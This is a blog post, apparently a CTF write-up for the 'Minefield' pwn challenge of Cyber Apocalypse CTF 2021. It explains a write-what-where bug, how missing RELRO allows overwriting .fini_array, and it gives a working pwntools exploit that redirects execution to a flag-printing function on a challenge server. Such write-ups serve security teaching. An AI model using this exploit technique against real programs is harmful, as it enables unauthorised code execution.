<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Cyber Apocalypse CTF 2021 - Minefield (Pwn) | amirr0r</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Cyber Apocalypse CTF 2021 - Minefield (Pwn)" /><meta name="author" content="amirr0r" /><meta property="og:locale" content="en_US" /><meta name="description" content="A few weeks ago I participated to Cyber Apocalypse CTF 2021 which was organized by hackthebox.eu, cryptohack.org and code.org. I mainly focused on Pwn, Reverse and Forensic challenges. Here is the writeup for the Minefield challenge. I will also post the writeup for the Controller challenge soon" /><meta property="og:description" content="A few weeks ago I participated to Cyber Apocalypse CTF 2021 which was organized by hackthebox.eu, cryptohack.org and code.org. I mainly focused on Pwn, Reverse and Forensic challenges. Here is the writeup for the Minefield challenge. I will also post the writeup for the Controller challenge soon" /><link rel="canonical" href="https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/" /><meta property="og:url" content="https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/" /><meta property="og:site_name" content="amirr0r" /><meta property="og:image" content="https://amirr0r.github.io/assets/img/ctf/cyber-apocalypse-2021/CyberApocalypseCTF2021.jpg" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-19T10:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://amirr0r.github.io/assets/img/ctf/cyber-apocalypse-2021/CyberApocalypseCTF2021.jpg" /><meta property="twitter:title" content="Cyber Apocalypse CTF 2021 - Minefield (Pwn)" /><meta name="twitter:site" content="@amirr0r_" /><meta name="twitter:creator" content="@amirr0r" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"A few weeks ago I participated to Cyber Apocalypse CTF 2021 which was organized by hackthebox.eu, cryptohack.org and code.org. I mainly focused on Pwn, Reverse and Forensic challenges. Here is the writeup for the Minefield challenge. I will also post the writeup for the Controller challenge soon","headline":"Cyber Apocalypse CTF 2021 - Minefield (Pwn)","dateModified":"2021-05-19T10:00:00+02:00","datePublished":"2021-05-19T10:00:00+02:00","@type":"BlogPosting","image":"https://amirr0r.github.io/assets/img/ctf/cyber-apocalypse-2021/CyberApocalypseCTF2021.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/"},"url":"https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/","author":{"@type":"Person","name":"amirr0r"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">amirr0r</a></div><div class="site-subtitle font-italic"></div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/amirr0r" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/amirr0r_" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/amir-barnat/?locale=en_US" target="_blank"> <i class="fab fa-linkedin-in"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Cyber Apocalypse CTF 2021 - Minefield (Pwn)</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, May 19, 2021, 10:00 AM +0200" > May 19, 2021 <i class="unloaded">2021-05-19T10:00:00+02:00</i> </span> by <span class="author"> amirr0r </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Aug 14, 2021, 12:41 AM +0200" > Aug 14, 2021 <i class="unloaded">2021-08-14T00:41:46+02:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/CyberApocalypseCTF2021.jpg" class="post-preview-img"><blockquote><p>A few weeks ago I participated to <a href="https://www.hackthebox.eu/cyber-apocalypse-ctf-2021">Cyber Apocalypse CTF 2021</a> which was organized by <a href="https://www.hackthebox.eu/">hackthebox.eu</a>, <a href="https://cryptohack.org/">cryptohack.org</a> and <a href="https://code.org/">code.org</a>. I mainly focused on Pwn, Reverse and Forensic challenges. Here is the writeup for the <a href="https://ctftime.org/task/15714">Minefield challenge</a>. I will also post the writeup for the <a href="https://ctftime.org/task/15698">Controller challenge</a> soon</p></blockquote><p>Let’s start by using the <code class="language-plaintext highlighter-rouge">file</code> command on the given binary:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file minefield
minefield: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>917a7e342565e55408ed3c698c7cd0707a9ddd9a, not stripped
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">minefield</code> is a <strong>64-bit ELF</strong>. It is dynamically linked, which means that the <strong>LIBC</strong> is not directly incorporated into the binary. Finally, it is <code class="language-plaintext highlighter-rouge">not stripped</code> so it contains symbols, which will allow us to debug and decompile it more easily.</p><p>By using <code class="language-plaintext highlighter-rouge">checksec</code>, we can see that the <strong>CANARY</strong> is active, and that the stack is not executable (<strong>NX</strong>):</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/checksec.PNG" alt="" /></p><blockquote><p><code class="language-plaintext highlighter-rouge">checksec</code> can be executed both from <code class="language-plaintext highlighter-rouge">gdb</code> and from outside <code class="language-plaintext highlighter-rouge">gdb</code>.</p></blockquote><p>Generally, in a CTF context, when CANARY is active, we can expect 2 scenarios:</p><ol><li><strong>bruteforcing</strong> it <em>(as in this <a href="https://www.dailysecurity.fr/la-stack-smashing-protection/">example</a>)</em></li><li>retrieving it by <strong>leaking the contents of the stack</strong> via a format string vulnerability <em>(as in this <a href="https://www.programmersought.com/article / 4093510679/">example</a>)</em>.</li></ol><p><strong>Spoil alert</strong>: in this case, it will be neither of the two scenarios :D</p><h2 id="1-identify-the-win-function">1. Identify the <code class="language-plaintext highlighter-rouge">win()</code> function</h2><p>Still in <code class="language-plaintext highlighter-rouge">gdb</code>, if we list the binary functions via the <code class="language-plaintext highlighter-rouge">info fu</code> command <em>(shortcut to the <code class="language-plaintext highlighter-rouge">info functions</code> command)</em>, we can see that there is a function with a strange name (“<code class="language-plaintext highlighter-rouge">_</code>”) :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/info_fu.PNG" alt="" /></p><p>We can decompile the binary using <code class="language-plaintext highlighter-rouge">ghidra</code> and look at the source code of this function:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/winfunction.png" alt="" /></p><p>The “<code class="language-plaintext highlighter-rouge">_</code>” function makes a call to <code class="language-plaintext highlighter-rouge">system("cat flag *")</code>.</p><p>Well done! We identified our <code class="language-plaintext highlighter-rouge">win()</code> function.</p><blockquote><p><strong>Note</strong>: in pwn challenges, we call “<code class="language-plaintext highlighter-rouge">win()</code> function” a function that allows you to open a shell or display the flag.</p></blockquote><p>The objective of this challenge is to find a way to redirect the execution flow and to call this <code class="language-plaintext highlighter-rouge">win()</code> function, despite the implemented protections CANARY and NX.</p><h2 id="2-reverse-engineering--arbitrary-write">2. Reverse engineering &amp; Arbitrary write</h2><p>The <code class="language-plaintext highlighter-rouge">main()</code> function calls the <code class="language-plaintext highlighter-rouge">menu()</code> function:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/main.png" alt="" /></p><p>The <code class="language-plaintext highlighter-rouge">menu()</code> function asks the user if he is ready to plant mines via the <code class="language-plaintext highlighter-rouge">scanf</code> function and stores the result in an <em>int</em> variable:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/menu.png" alt="" /></p><p>If the user does not enter either “1” or “2” then the <code class="language-plaintext highlighter-rouge">invalid()</code> function is called and displays “Mission failed!”:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/invalid.png" alt="" /></p><p>If the user does not enter “1”, then the user is considered not to be ready. The <code class="language-plaintext highlighter-rouge">choice()</code> function is called and displays the following message:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/choice.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/no.png" alt="" /></p><p>Finally, if the user enters “2” then the user is considered ready and the <code class="language-plaintext highlighter-rouge">mission()</code> function is called.</p><p>The <code class="language-plaintext highlighter-rouge">mission()</code> function waits for two values:</p><ol><li>“Insert type of mine:” → in a 10 characters buffer (<code class="language-plaintext highlighter-rouge">local_24</code>)</li><li>“Insert location to plant:” → also in a 10 characters buffer (<code class="language-plaintext highlighter-rouge">local_1a</code>)</li></ol><p>Each user input is converted to <em>unsigned long long int</em> via the <strong>LIBC</strong>’s function of <a href="https://linux.die.net/man/3/strtoull">strtoull</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/source.png" alt="" /></p><p>User input is handled by the <code class="language-plaintext highlighter-rouge">r()</code> function which is just a “wrapper” around the <code class="language-plaintext highlighter-rouge">read()</code> function of the <strong>LIBC</strong> (with the CANARY support).</p><p>It will read 9 characters from the standard input (<code class="language-plaintext highlighter-rouge">stdin</code>):</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/r.png" alt="" /></p><p>When we run the binary, we get a <em>segmentation fault</em> systematically:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/segfault.png" alt="" /></p><p>This is because of this line in the <code class="language-plaintext highlighter-rouge">mission()</code> function:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/overwrite.png" alt="" /></p><p>This is a typical <strong>write-what-where</strong> instruction, i.e that we can write what we want, where we want. The address pointed by <code class="language-plaintext highlighter-rouge">puVar1</code> is replaced by the address <code class="language-plaintext highlighter-rouge">uVar2</code>.</p><ul><li><code class="language-plaintext highlighter-rouge">puVar1</code> corresponds to our input for “Insert type of mine:” converted to <em>unsigned long long int</em></li><li><code class="language-plaintext highlighter-rouge">uVar1</code> corresponds to our input for “Insert location to plant:” converted to <em>unsigned long long int</em></li></ul><p>Our strategy will be as follows:</p><ul><li>using this <strong>write-what-where</strong> to replace the address of a function executed after the <code class="language-plaintext highlighter-rouge">mission()</code> function, with the address of the function “<code class="language-plaintext highlighter-rouge">_</code>” .</li></ul><p>To do this, we can corrupt the memory by modifying the Procedure Linkage Table (<strong>PLT</strong>) or the <strong>.fini_array</strong> section:</p><blockquote><p><strong>.fini_array</strong> is an array of functions called when the program terminates.</p></blockquote><blockquote><p>The <strong>PLT</strong> is an array of function pointers. Every function called by the program that resides in an external library (such as the LIBC) resides in the PLT. The reason it is writable during the runtime is because of the support for <strong>lazy liking</strong> (which consists in resolving the address of a function is only when it is called for the first time)</p></blockquote><p>So if we modify <strong>.fini_array</strong> by inserting the address of the function “<code class="language-plaintext highlighter-rouge">_</code>”, we will win.</p><blockquote><p>It is possible to corrupt these sections because <strong>RELRO</strong> (Relocation Read-Only) protection has not been activated. This protection makes the “data” sections (GOT, PLT…) accessible only in read-only mode.</p></blockquote><h2 id="3-writing-the-exploit">3. Writing the exploit</h2><p>When you start to write an exploit, it is good to have a template/skeleton that you can start from. The one I am using is the following:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">remote</span> <span class="o">=</span> <span class="bp">False</span>

<span class="n">binary_path</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>

<span class="k">if</span> <span class="n">remote</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>

<span class="c1"># Exploit code starts here :)
</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><ul><li>Then, we start by retrieving the address of the <code class="language-plaintext highlighter-rouge">win()</code> function:</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">win_fn</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_'</span><span class="p">]</span>
</pre></table></code></div></div><blockquote><p>It is also possible to add the address manually by retrieving it via the command <code class="language-plaintext highlighter-rouge">nm minefield | grep "_"</code>. But doing it this way is less elegant than using <code class="language-plaintext highlighter-rouge">pwntools</code> directly ^^</p></blockquote><ul><li>We get the address of the section <strong>.fini_array</strong>:</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">fini_array_addr</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.fini_array'</span><span class="p">).</span><span class="n">header</span><span class="p">.</span><span class="n">sh_addr</span>
</pre></table></code></div></div><blockquote><p>We can also add the address manually by retrieving it via the command <code class="language-plaintext highlighter-rouge">info files</code> inside <code class="language-plaintext highlighter-rouge">gdb</code>. But doing it this way is less elegant than using <code class="language-plaintext highlighter-rouge">pwntools</code> directly ^^</p></blockquote><ul><li>We can print these two addresses in hexadecimal::</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Win function '_' address: 0x%x"</span> <span class="o">%</span> <span class="n">win_fn</span><span class="p">)</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">".fini_array section address: 0x%x"</span> <span class="o">%</span> <span class="n">fini_array_addr</span><span class="p">)</span>
</pre></table></code></div></div><ul><li>The binary waits for 3 inputs:</li></ul><ol><li>“Are you ready to plant the mine?” → “2” and then call the <code class="language-plaintext highlighter-rouge">mission()</code> function</li><li>“Insert type of mine:” → address where we will write to</li><li>“Insert location to plant:” → address we want to write</li></ol><blockquote><p>Before interacting directly with the server on which the binary is being executed, it is better to test the exploit locally by creating a “flag.txt” file and check if we called the “<code class="language-plaintext highlighter-rouge">_</code>” function successfully.</p></blockquote><ul><li>With the following exploit it is possible to recover the flag:</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"138.68.147.232"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">30174</span>

<span class="n">remote</span> <span class="o">=</span> <span class="bp">True</span>

<span class="n">binary_path</span> <span class="o">=</span> <span class="s">'./minefield'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>

<span class="k">if</span> <span class="n">remote</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>

<span class="n">win_fn</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_'</span><span class="p">]</span> <span class="c1"># nm minefield | grep "_"
</span><span class="n">fini_array_addr</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.fini_array'</span><span class="p">).</span><span class="n">header</span><span class="p">.</span><span class="n">sh_addr</span> <span class="c1"># (gdb) info files
</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Win function '_' address: 0x%x"</span> <span class="o">%</span> <span class="n">win_fn</span><span class="p">)</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">".fini_array section address: 0x%x"</span> <span class="o">%</span> <span class="n">fini_array_addr</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>                                     
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Insert type of mine: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">fini_array_addr</span><span class="p">))</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Insert location to plant: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">win_fn</span><span class="p">))</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
